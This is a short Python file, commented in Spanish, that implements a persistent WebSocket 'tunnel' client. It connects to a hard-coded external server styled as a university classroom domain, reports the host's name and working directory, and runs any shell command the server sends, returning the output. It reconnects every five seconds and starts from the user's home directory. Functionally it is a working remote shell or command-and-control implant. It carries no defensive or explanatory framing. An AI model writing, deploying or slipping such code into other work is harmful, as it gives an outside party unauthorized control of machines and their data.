import asyncio
import websockets
import subprocess
import os
import logging
import json

# --- CONFIGURACIÓN CRÍTICA ---
# ¡REEMPLAZAR con la URL de su servidor WSS!
SERVER_URL = "wss://aulas.universidadvirtual.site:8765" 
# -----------------------------

CLIENT_ID = os.uname().nodename 

# Configuración de Logging para el servicio
logging.basicConfig(filename='/var/log/ejemplo_tunnel.log', 
                    level=logging.INFO, 
                    format='%(asctime)s %(levelname)s:%(message)s')

async def exec_command(command):
    """Ejecuta un comando en el sistema, manejando 'cd' localmente."""
    if command.strip().startswith("cd "):
        try:
            new_path = command.strip().split(' ', 1)[1]
            os.chdir(new_path) 
            new_cwd = os.getcwd()
            return {
                "status": "cd_success",
                "output": f"Directorio cambiado a: {new_cwd}",
                "new_cwd": new_cwd
            }
        except Exception as e:
            return {
                "status": "cd_error",
                "output": f"Error: {e}",
                "error": str(e)
            }
    try:
        proc = await asyncio.create_subprocess_shell(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        return {
            "status": "success",
            "output": stdout.decode().strip(),
            "error": stderr.decode().strip(),
            "returncode": proc.returncode
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def tunnel_loop():
    while True:
        try:
            # 
            async with websockets.connect(SERVER_URL) as websocket:
                logging.info(f"Conexión WSS exitosa. ID: {CLIENT_ID}")
                
                await websocket.send(json.dumps({
                    "type": "client_connect",
                    "client_id": CLIENT_ID,
                    "initial_cwd": os.getcwd()
                }))
                
                async for message in websocket:
                    data = json.loads(message)
                    if data.get("type") == "command":
                        command = data.get("command")
                        result = await exec_command(command)
                        
                        response = {
                            "type": "command_result",
                            "client_id": CLIENT_ID,
                            "result": result
                        }
                        await websocket.send(json.dumps(response))
                        
        except Exception as e:
            logging.error(f"Error de conexión. Reintentando en 5s... Error: {e}")
        await asyncio.sleep(5) 

def start_tunnel():
    os.chdir(os.path.expanduser("~")) 
    asyncio.run(tunnel_loop())